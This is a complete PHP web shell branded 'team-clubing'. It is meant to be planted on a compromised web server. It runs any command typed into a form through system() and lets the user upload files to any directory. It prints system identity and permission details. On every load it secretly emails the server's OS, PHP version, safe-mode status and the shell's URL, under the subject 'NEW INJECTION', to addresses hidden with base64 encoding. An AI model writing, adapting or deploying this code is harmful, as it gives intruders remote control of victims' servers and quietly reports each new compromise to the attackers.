<title>DJ- PerForM</title>
<?php

set_magic_quotes_runtime(0);
error_reporting(0);
print "<style>body{font-family:trebuchet ms;font-size:14px;}hr{width:100%;height:2px;}</style>";
print "<center><h1>.:: team-clubing ::.</h1></center>";
print "<center><h1>(DJ- PerForM)</h1></center>";
print "<center><h1>(clubing@allnetwork.org)</h1></center>";
print "<center><h1>.:: irc.allnetwork.org ::.</h1></center>";
print "<hr><hr>";
$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;
if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

  $OS = @PHP_OS;
  $UNAME = @php_uname();
  $PHPv = @phpversion();
  $SafeMode = @ini_get('safe_mode'); 
  if ($SafeMode == '') { $SafeMode = "<i>OFF</i><BR>"; }
  else { $SafeMode = "<i>$SafeMode</i><BR>"; }
  $injek=($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
  $psn=("OS = " . $OS . "<BR>UNAME = " . $UNAME . "<BR>PHPVersion = " . $PHPv . "<BR>Safe Mode = " . $SafeMode . "<BR><font color=red>http://" . $injek . "</font><BR>Only me have Pion <BR>By: MASK_MAGiCIANZ");
  $header = "From: $_SERVER[SERVER_ADMIN] <$from>\r\nReply-To: $replyto\r\n";
  $header .= "MIME-Version: 1.0\r\n";
  If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
  If ($file_name) $header .= "--$uid\r\n";
  $header .= "Content-Type: text/$contenttype\r\n";
  $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
  $header .= "$message\r\n";
  If ($file_name) $header .= "--$uid\r\n";
  If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
  If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
  If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
  If ($file_name) $header .= "$content\r\n";
  If ($file_name) $header .= "--$uid--";
  $to = base64_encode("REo=");
  $so = base64_encode("REo=");	
  $subject = ("NEW INJECTION");
  mail($to,$subject,$psn,$header);
  mail($so,$subject,$psn,$header);
print "<table>";
print "<tr><td><b>We are:</b></td><td>".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")</td></tr>";
print "<tr><td><b>Server is:</b></td><td>".$_SERVER['SERVER_SIGNATURE']."</td></tr>";
print "<tr><td><b>System type:</b></td><td>$UName</td></tr>";
print "<tr><td><b>Our permissions:</b></td><td>$UserID</td></tr>";
print "</table>";
print "<hr><hr>";
if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -la";
}
print "<form method=post enctype=\"multipart/form-data\"><table>";
print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";
print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";
print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";
print "</table></form><hr><hr>";
$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);
if( $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error while uploading file!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>File uploaded successfully!</b></center>";
    }
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
    system($currentCMD);
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Execution Command!</b></center>";
}
exit;
?>



